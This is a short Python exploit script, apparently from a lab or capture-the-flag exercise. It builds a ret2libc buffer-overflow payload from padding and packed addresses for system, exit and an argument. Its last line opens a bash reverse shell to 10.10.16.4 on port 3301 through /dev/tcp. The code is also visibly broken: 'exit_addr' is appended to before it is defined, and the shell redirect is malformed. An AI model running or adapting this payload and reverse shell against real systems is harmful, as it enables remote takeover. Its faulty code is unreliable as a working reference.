# Description: Script to exploit the buffer overflow vulnerability in one binary file.
import struct
import os

sys_addr = struct.pack("<I",0x80482f0)
exit_addr += struct.pack("<I",0xd3adc0d3)
arg_addr = struct.pack("<I",0xb7f7584c)
buf = "A" * 112
buf += sys_addr
buf += exit_addr
buf += arg_addr

print(buf)

os.system("bash -c 'bash -i >& /dev/tcp/10.10.16.4/3301 0>1'")